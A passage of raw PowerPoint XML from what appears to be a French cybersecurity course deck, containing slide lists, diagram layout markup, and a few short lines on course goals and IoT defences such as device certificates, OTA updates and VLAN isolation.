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53"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="257" r:id="rId3"/>
    <p:sldId id="258" r:id="rId4"/>
    <p:sldId id="278" r:id="rId5"/>
    <p:sldId id="259" r:id="rId6"/>
    <p:sldId id="279" r:id="rId7"/>
    <p:sldId id="260" r:id="rId8"/>
    <p:sldId id="280" r:id="rId9"/>
    <p:sldId id="261" r:id="rId10"/>
    <p:sldId id="281" r:id="rId11"/>
    <p:sldId id="262" r:id="rId12"/>
    <p:sldId id="282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263" r:id="rId25"/>
    <p:sldId id="283" r:id="rId26"/>
    <p:sldId id="372" r:id="rId27"/>
    <p:sldId id="373" r:id="rId28"/>
    <p:sldId id="374" r:id="rId29"/>
    <p:sldId id="375" r:id="rId30"/>
    <p:sldId id="376" r:id="rId31"/>
    <p:sldId id="377" r:id="rId32"/>
    <p:sldId id="378" r:id="rId33"/>
    <p:sldId id="379" r:id="rId34"/>
    <p:sldId id="264" r:id="rId35"/>
    <p:sldId id="380" r:id="rId36"/>
    <p:sldId id="381" r:id="rId37"/>
    <p:sldId id="382" r:id="rId38"/>
    <p:sldId id="383" r:id="rId39"/>
    <p:sldId id="384" r:id="rId40"/>
    <p:sldId id="385" r:id="rId41"/>
    <p:sldId id="386" r:id="rId42"/>
    <p:sldId id="265" r:id="rId43"/>
    <p:sldId id="284" r:id="rId44"/>
    <p:sldId id="277" r:id="rId45"/>
    <p:sldId id="266" r:id="rId46"/>
    <p:sldId id="285" r:id="rId47"/>
    <p:sldId id="286" r:id="rId48"/>
    <p:sldId id="287" r:id="rId49"/>
    <p:sldId id="288" r:id="rId50"/>
    <p:sldId id="387" r:id="rId51"/>
    <p:sldId id="388" r:id="rId52"/>
    <p:sldId id="390" r:id="rId53"/>
    <p:sldId id="391" r:id="rId54"/>
    <p:sldId id="267" r:id="rId55"/>
    <p:sldId id="268" r:id="rId56"/>
    <p:sldId id="269" r:id="rId57"/>
    <p:sldId id="270" r:id="rId58"/>
    <p:sldId id="271" r:id="rId59"/>
    <p:sldId id="272" r:id="rId60"/>
    <p:sldId id="273" r:id="rId61"/>
    <p:sldId id="274" r:id="rId62"/>
    <p:sldId id="275" r:id="rId63"/>
    <p:sldId id="289" r:id="rId64"/>
    <p:sldId id="276" r:id="rId65"/>
    <p:sldId id="290" r:id="rId66"/>
    <p:sldId id="392" r:id="rId67"/>
    <p:sldId id="393" r:id="rId68"/>
    <p:sldId id="394" r:id="rId69"/>
    <p:sldId id="395" r:id="rId70"/>
    <p:sldId id="396" r:id="rId71"/>
    <p:sldId id="397" r:id="rId72"/>
    <p:sldId id="398" r:id="rId73"/>
    <p:sldId id="399" r:id="rId74"/>
    <p:sldId id="400" r:id="rId75"/>
    <p:sldId id="401" r:id="rId76"/>
    <p:sldId id="402" r:id="rId77"/>
    <p:sldId id="403" r:id="rId78"/>
    <p:sldId id="404" r:id="rId79"/>
    <p:sldId id="405" r:id="rId80"/>
    <p:sldId id="406" r:id="rId81"/>
    <p:sldId id="407" r:id="rId82"/>
    <p:sldId id="291" r:id="rId83"/>
    <p:sldId id="292" r:id="rId84"/>
    <p:sldId id="293" r:id="rId85"/>
    <p:sldId id="294" r:id="rId86"/>
    <p:sldId id="295" r:id="rId87"/>
    <p:sldId id="296" r:id="rId88"/>
    <p:sldId id="297" r:id="rId89"/>
    <p:sldId id="298" r:id="rId90"/>
    <p:sldId id="299" r:id="rId91"/>
    <p:sldId id="300" r:id="rId92"/>
    <p:sldId id="301" r:id="rId93"/>
    <p:sldId id="302" r:id="rId94"/>
    <p:sldId id="303" r:id="rId95"/>
    <p:sldId id="304" r:id="rId96"/>
    <p:sldId id="305" r:id="rId97"/>
    <p:sldId id="306" r:id="rId98"/>
    <p:sldId id="307" r:id="rId99"/>
    <p:sldId id="308" r:id="rId100"/>
    <p:sldId id="309" r:id="rId101"/>
    <p:sldId id="310" r:id="rId102"/>
    <p:sldId id="311" r:id="rId103"/>
    <p:sldId id="312" r:id="rId104"/>
    <p:sldId id="313" r:id="rId105"/>
    <p:sldId id="314" r:id="rId106"/>
    <p:sldId id="315" r:id="rId107"/>
    <p:sldId id="316" r:id="rId108"/>
    <p:sldId id="317" r:id="rId109"/>
    <p:sldId id="318" r:id="rId110"/>
    <p:sldId id="319" r:id="rId111"/>
    <p:sldId id="320" r:id="rId112"/>
    <p:sldId id="321" r:id="rId113"/>
    <p:sldId id="322" r:id="rId114"/>
    <p:sldId id="323" r:id="rId115"/>
    <p:sldId id="324" r:id="rId116"/>
    <p:sldId id="326" r:id="rId117"/>
    <p:sldId id="325" r:id="rId118"/>
    <p:sldId id="327" r:id="rId119"/>
    <p:sldId id="328" r:id="rId120"/>
    <p:sldId id="329" r:id="rId121"/>
    <p:sldId id="330" r:id="rId122"/>
    <p:sldId id="331" r:id="rId123"/>
    <p:sldId id="332" r:id="rId124"/>
    <p:sldId id="333" r:id="rId125"/>
    <p:sldId id="334" r:id="rId126"/>
    <p:sldId id="335" r:id="rId127"/>
    <p:sldId id="336" r:id="rId128"/>
    <p:sldId id="337" r:id="rId129"/>
    <p:sldId id="338" r:id="rId130"/>
    <p:sldId id="339" r:id="rId131"/>
    <p:sldId id="340" r:id="rId132"/>
    <p:sldId id="341" r:id="rId133"/>
    <p:sldId id="342" r:id="rId134"/>
    <p:sldId id="343" r:id="rId135"/>
    <p:sldId id="344" r:id="rId136"/>
    <p:sldId id="345" r:id="rId137"/>
    <p:sldId id="346" r:id="rId138"/>
    <p:sldId id="347" r:id="rId139"/>
    <p:sldId id="348" r:id="rId140"/>
    <p:sldId id="349" r:id="rId141"/>
    <p:sldId id="350" r:id="rId142"/>
    <p:sldId id="351" r:id="rId143"/>
    <p:sldId id="352" r:id="rId144"/>
    <p:sldId id="353" r:id="rId145"/>
    <p:sldId id="354" r:id="rId146"/>
    <p:sldId id="355" r:id="rId147"/>
    <p:sldId id="356" r:id="rId148"/>
    <p:sldId id="357" r:id="rId149"/>
    <p:sldId id="358" r:id="rId150"/>
    <p:sldId id="359" r:id="rId151"/>
    <p:sldId id="360" r:id="rId152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ata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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.svg"/></Relationships>
</file>

<file path=ppt/diagrams/_rels/data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_rels/data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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image52.svg"/></Relationships>
</file>

<file path=ppt/diagrams/_rels/drawing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diagrams/_rels/drawing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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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E0FD6B-DA39-455E-9DAD-3033FA396E3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89AB858-0DE9-4567-A248-97F1AAF62932}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Comprendre le contexte actuel des menaces en cybersécurité.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AD50061D-BA0A-496F-9A03-A1B9B193163E}" type="parTrans" cxnId="{2728E243-AA69-4E37-826E-4C86A6439613}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5DD8D19D-D986-43BF-B2EB-56553DB9639C}" type="sibTrans" cxnId="{2728E243-AA69-4E37-826E-4C86A6439613}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8F0BB936-7EC3-4772-A47F-D3CC2E64FF2A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Explorer les dernières techniques d’attaques et de défense.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{21FEACB0-8934-460D-80BB-4F571F62D88D}" type="parTrans" cxnId="{48B2E9F8-E939-40DC-97D5-1BB5EFC4F28D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{EE9278A6-D184-47A4-A0D6-BC23D816F602}" type="sibTrans" cxnId="{48B2E9F8-E939-40DC-97D5-1BB5EFC4F28D}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{09DD3CB2-8BEA-4CA1-9414-DA1B3CF27579}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Comprendre les bases de l’architecture logicielle (C, assembleur).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{136A808B-8F89-4283-B84C-B0E3B12D848D}" type="parTrans" cxnId="{06BED547-B5FC-4D40-97A9-8E4ACBA09DF0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{07F34D66-04F1-4707-9E28-87265CCF937F}" type="sibTrans" cxnId="{06BED547-B5FC-4D40-97A9-8E4ACBA09DF0}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{54889128-AEEA-4B82-85A0-F6AA7CFA18A1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Préparer le terrain pour la manipulation de vulnérabilités.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3E605B99-FF89-447C-934D-1E17B9E0457A}" type="parTrans" cxnId="{AB0D7DCD-40D2-428D-99EF-B73AE54A9A10}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E544C6AF-F3AB-45E5-A520-85BAC56BF7C3}" type="sibTrans" cxnId="{AB0D7DCD-40D2-428D-99EF-B73AE54A9A10}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" type="pres">
      <dgm:prSet presAssocID="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1BC7BCE7-244B-3948-B06B-F0288137E3B3}" type="pres">
      <dgm:prSet presAssocID="{D89AB858-0DE9-4567-A248-97F1AAF6293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F032CB3-5500-E54A-857D-9EA585516418}" type="pres">
      <dgm:prSet presAssocID="{5DD8D19D-D986-43BF-B2EB-56553DB9639C}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{8F5F0304-971C-D34D-B47B-3E32AF3444F2}" type="pres">
      <dgm:prSet presAssocID="{8F0BB936-7EC3-4772-A47F-D3CC2E64FF2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5E60962-6C43-D64D-B7C1-E4C50FF801F8}" type="pres">
      <dgm:prSet presAssocID="{EE9278A6-D184-47A4-A0D6-BC23D816F602}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C68DDC48-E102-574C-935E-753C6EC7DB97}" type="pres">
      <dgm:prSet presAssocID="{09DD3CB2-8BEA-4CA1-9414-DA1B3CF2757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4823B6F-1D75-514F-98BA-DB7D2B42C149}" type="pres">
      <dgm:prSet presAssocID="{07F34D66-04F1-4707-9E28-87265CCF937F}" presName="spacer" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F8D41395-5687-B94D-9E02-F150C1832140}" type="pres">
      <dgm:prSet presAssocID="{54889128-AEEA-4B82-85A0-F6AA7CFA18A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6343B07-FA38-0740-9CCC-402C3F866263}" type="presOf" srcId="{09DD3CB2-8BEA-4CA1-9414-DA1B3CF27579}" destId="{C68DDC48-E102-574C-935E-753C6EC7DB97}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{320C6C3E-804C-1A4A-99F3-034FEBEC39B2}" type="presOf" srcId="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" destId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{2728E243-AA69-4E37-826E-4C86A6439613}" srcId="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" destId="{D89AB858-0DE9-4567-A248-97F1AAF62932}" srcOrd="0" destOrd="0" parTransId="{AD50061D-BA0A-496F-9A03-A1B9B193163E}" sibTransId="{5DD8D19D-D986-43BF-B2EB-56553DB9639C}"/>
    <dgm:cxn modelId="{84F1B946-F8FA-DF46-8A21-1774BCED97F5}" type="presOf" srcId="{8F0BB936-7EC3-4772-A47F-D3CC2E64FF2A}" destId="{8F5F0304-971C-D34D-B47B-3E32AF3444F2}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{06BED547-B5FC-4D40-97A9-8E4ACBA09DF0}" srcId="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" destId="{09DD3CB2-8BEA-4CA1-9414-DA1B3CF27579}" srcOrd="2" destOrd="0" parTransId="{136A808B-8F89-4283-B84C-B0E3B12D848D}" sibTransId="{07F34D66-04F1-4707-9E28-87265CCF937F}"/>
    <dgm:cxn modelId="{06504781-F08A-C840-9BAB-88F2288E40DC}" type="presOf" srcId="{D89AB858-0DE9-4567-A248-97F1AAF62932}" destId="{1BC7BCE7-244B-3948-B06B-F0288137E3B3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{AB0D7DCD-40D2-428D-99EF-B73AE54A9A10}" srcId="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" destId="{54889128-AEEA-4B82-85A0-F6AA7CFA18A1}" srcOrd="3" destOrd="0" parTransId="{3E605B99-FF89-447C-934D-1E17B9E0457A}" sibTransId="{E544C6AF-F3AB-45E5-A520-85BAC56BF7C3}"/>
    <dgm:cxn modelId="{C07E28D3-270E-D34B-940C-21A1E2269B80}" type="presOf" srcId="{54889128-AEEA-4B82-85A0-F6AA7CFA18A1}" destId="{F8D41395-5687-B94D-9E02-F150C1832140}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{48B2E9F8-E939-40DC-97D5-1BB5EFC4F28D}" srcId="{F4E0FD6B-DA39-455E-9DAD-3033FA396E33}" destId="{8F0BB936-7EC3-4772-A47F-D3CC2E64FF2A}" srcOrd="1" destOrd="0" parTransId="{21FEACB0-8934-460D-80BB-4F571F62D88D}" sibTransId="{EE9278A6-D184-47A4-A0D6-BC23D816F602}"/>
    <dgm:cxn modelId="{35E248F9-7C0D-2B48-AECB-53D22821E980}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{1BC7BCE7-244B-3948-B06B-F0288137E3B3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{9F5B1680-689E-904E-88E4-08551F884E93}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{FF032CB3-5500-E54A-857D-9EA585516418}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{3E916853-9582-4649-A8CA-BBD6C01CDCEB}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{8F5F0304-971C-D34D-B47B-3E32AF3444F2}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{DDAF8C5B-A696-1D47-B821-1E6109021ECA}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{55E60962-6C43-D64D-B7C1-E4C50FF801F8}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{1E000D96-E768-BD42-AD63-9F3CE3C0C41D}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{C68DDC48-E102-574C-935E-753C6EC7DB97}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{42DD0069-A067-374C-B330-3F34DE3BB4ED}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{04823B6F-1D75-514F-98BA-DB7D2B42C149}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/vList2"/>
    <dgm:cxn modelId="{6CC97331-9FEC-AD44-AF5D-243E319351B9}" type="presParOf" srcId="{693E3508-F679-BD46-913F-F5B5CF1A0243}" destId="{F8D41395-5687-B94D-9E02-F150C18321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C5DE5C-FB3E-432B-AE58-8AB20F5DCE1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984860-6168-4AC5-A9FD-E8DAED4EF88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Authentification renforcée :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Utilisation de certificats numériques pour chaque appareil.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{794002F5-A02E-489F-85EB-84F99FDF8A45}" type="parTrans" cxnId="{4DD4C9A2-4B4A-4E16-91A5-73AF55A78FE8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2739357A-9A50-4F1F-AF09-0CECF2018662}" type="sibTrans" cxnId="{4DD4C9A2-4B4A-4E16-91A5-73AF55A78FE8}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3C75EA38-85A8-40AD-89FC-BC02A210F19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Mises à jour automatisées :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Déploiement continu de correctifs via OTA (Over-The-Air).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F94447D2-932F-4C01-BDBD-397E5912F38D}" type="parTrans" cxnId="{F31B271F-05E2-4AD8-BC8A-53FD5BBD6810}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F08DAD33-6218-4AA5-A60E-D35E8E28967F}" type="sibTrans" cxnId="{F31B271F-05E2-4AD8-BC8A-53FD5BBD6810}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{06476024-975E-48B8-B39E-791D9C353DE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Segmentations réseau :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Isolation des objets connectés dans des VLAN dédiés.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AF4B1100-250B-4C17-9107-F2DD3B5E8FB6}" type="parTrans" cxnId="{72678429-310A-4C0B-A26C-46FAE3D075D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{431ADB4D-28B9-4864-AE24-801BD62DC7AD}" type="sibTrans" cxnId="{72678429-310A-4C0B-A26C-46FAE3D075D5}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" type="pres">
      <dgm:prSet presAssocID="{DDC5DE5C-FB3E-432B-AE58-8AB20F5DCE16}" presName="root" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{84E512AF-E414-481F-8BED-ECA56D5F840A}" type="pres">
      <dgm:prSet presAssocID="{0F984860-6168-4AC5-A9FD-E8DAED4EF880}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A4F5CE5C-8F28-4258-8179-7B3C628AD1DF}" type="pres">
      <dgm:prSet presAssocID="{0F984860-6168-4AC5-A9FD-E8DAED4EF88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BAF22055-CC79-4358-83E7-266ED87C125A}" type="pres">
      <dgm:prSet presAssocID="{0F984860-6168-4AC5-A9FD-E8DAED4EF880}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5B3B43EB-5A37-4337-8B22-6F3D71F11C45}" type="pres">
      <dgm:prSet presAssocID="{0F984860-6168-4AC5-A9FD-E8DAED4EF880}" presName="textRect" presStyleLbl="revTx" presStyleIdx="0" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:chPref val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C3D3979B-A7D8-4A82-90C1-4B22883C142B}" type="pres">
      <dgm:prSet presAssocID="{2739357A-9A50-4F1F-AF09-0CECF2018662}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{4161183B-56DB-49B5-8473-A00C6CED27A8}" type="pres">
      <dgm:prSet presAssocID="{3C75EA38-85A8-40AD-89FC-BC02A210F197}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{9E942A9D-B9BE-4918-B117-070E115AEB0C}" type="pres">
      <dgm:prSet presAssocID="{3C75EA38-85A8-40AD-89FC-BC02A210F19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D175692-0D9F-4203-A8AE-B3DA171A291C}" type="pres">
      <dgm:prSet presAssocID="{3C75EA38-85A8-40AD-89FC-BC02A210F197}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{424956B0-1B85-4A89-B3FB-1583D8EA8674}" type="pres">
      <dgm:prSet presAssocID="{3C75EA38-85A8-40AD-89FC-BC02A210F197}" presName="textRect" presStyleLbl="revTx" presStyleIdx="1" presStyleCnt="3">
        <dgm:presLayoutVars>
          <dgm:chMax val="1"/>
          <dgm:chPref val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{1F423333-175B-4AE8-B670-4963F6A7F88A}" type="pres">
      <dgm:prSet presAssocID="{F08DAD33-6218-4AA5-A60E-D35E8E28967F}" presName="sibTrans" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BC9788AD-D0B6-4E59-892C-E04BA30BB593}" type="pres">
      <dgm:prSet presAssocID="{06476024-975E-48B8-B39E-791D9C353DE8}" presName="compNode" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A65F9E55-2EE0-43E2-88E2-52971D396432}" type="pres">
      <dgm:prSet presAssocID="{06476024-975E-48B8-B39E-791D9C353DE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026F0898-EF17-447A-84EE-32BDAF641DCB}" type="pres">
      <dgm:prSet presAssocID="{06476024-975E-48B8-B39E-791D9C353DE8}" presName="spaceRect" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{714E1A8C-572F-4DF0-8FBB-435C70C08CD3}" type="pres">
      <dgm:prSet presAssocID="{06476024-975E-48B8-B39E-791D9C353DE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31B271F-05E2-4AD8-BC8A-53FD5BBD6810}" srcId="{DDC5DE5C-FB3E-432B-AE58-8AB20F5DCE16}" destId="{3C75EA38-85A8-40AD-89FC-BC02A210F197}" srcOrd="1" destOrd="0" parTransId="{F94447D2-932F-4C01-BDBD-397E5912F38D}" sibTransId="{F08DAD33-6218-4AA5-A60E-D35E8E28967F}"/>
    <dgm:cxn modelId="{72678429-310A-4C0B-A26C-46FAE3D075D5}" srcId="{DDC5DE5C-FB3E-432B-AE58-8AB20F5DCE16}" destId="{06476024-975E-48B8-B39E-791D9C353DE8}" srcOrd="2" destOrd="0" parTransId="{AF4B1100-250B-4C17-9107-F2DD3B5E8FB6}" sibTransId="{431ADB4D-28B9-4864-AE24-801BD62DC7AD}"/>
    <dgm:cxn modelId="{A4EAE72D-6CEF-4ECE-8952-396CEB9B4BC1}" type="presOf" srcId="{0F984860-6168-4AC5-A9FD-E8DAED4EF880}" destId="{5B3B43EB-5A37-4337-8B22-6F3D71F11C45}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{2C261D4C-E47E-465A-852C-33E915DAE1DA}" type="presOf" srcId="{DDC5DE5C-FB3E-432B-AE58-8AB20F5DCE16}" destId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{45D3E085-B4BF-45B5-BB6C-72D82095E245}" type="presOf" srcId="{3C75EA38-85A8-40AD-89FC-BC02A210F197}" destId="{424956B0-1B85-4A89-B3FB-1583D8EA8674}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{6AE63494-3658-458A-8D83-8D23D97B38E4}" type="presOf" srcId="{06476024-975E-48B8-B39E-791D9C353DE8}" destId="{714E1A8C-572F-4DF0-8FBB-435C70C08CD3}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{4DD4C9A2-4B4A-4E16-91A5-73AF55A78FE8}" srcId="{DDC5DE5C-FB3E-432B-AE58-8AB20F5DCE16}" destId="{0F984860-6168-4AC5-A9FD-E8DAED4EF880}" srcOrd="0" destOrd="0" parTransId="{794002F5-A02E-489F-85EB-84F99FDF8A45}" sibTransId="{2739357A-9A50-4F1F-AF09-0CECF2018662}"/>
    <dgm:cxn modelId="{20936F4B-2FF0-454F-B05B-70EA2FBFC583}" type="presParOf" srcId="{4BEB1928-DF3D-4220-9105-9F3CF596F173}" destId="{84E512AF-E414-481F-8BED-ECA56D5F840A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{B19778D8-A980-4B64-8461-793634D7775B}" type="presParOf" srcId="{84E512AF-E414-481F-8BED-ECA56D5F840A}" destId="{A4F5CE5C-8F28-4258-8179-7B3C628AD1DF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
    <dgm:cxn modelId="{7355B9E7-AE3E-40CA-92A0-83524DF5A583}" type="presParOf" srcId="{84E512AF-E414-481F-8BED-ECA56D5F840A}" destId="{BAF22055-CC79-4358-83E7-266ED87C125A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2018/2/layout/IconLabelList"/>
